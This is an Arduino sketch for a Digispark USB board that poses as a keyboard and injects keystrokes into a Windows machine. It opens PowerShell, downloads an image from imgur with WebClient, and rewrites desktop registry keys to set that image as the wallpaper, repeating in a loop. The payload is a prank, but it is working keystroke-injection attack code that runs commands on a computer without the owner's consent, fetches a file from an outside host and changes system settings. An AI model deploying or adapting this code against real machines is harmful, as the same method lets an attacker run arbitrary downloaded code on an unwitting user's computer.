#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell"); // Opening Powershell
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$client = new-object System.Net.WebClient"); // Sending a request to website
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$client.DownloadFile(\"https://i.imgur.com/gWbUIJM.jpg\" , \"floppa.jpg\")"); // Downloading a file from the internet
  DigiKeyboard.delay(500);
  // comment start: Editing PC's configuration
  // comment start: " = \"
  // comment start: \ = \\ 
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v wallpaper /t REG_SZ /d \"\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v wallpaper /t REG_SZ /d \"%USERPROFILE%\\floppa.jpg\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v wallpaperStyle /t REG_SZ /d 2 /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"); // Updating background
}
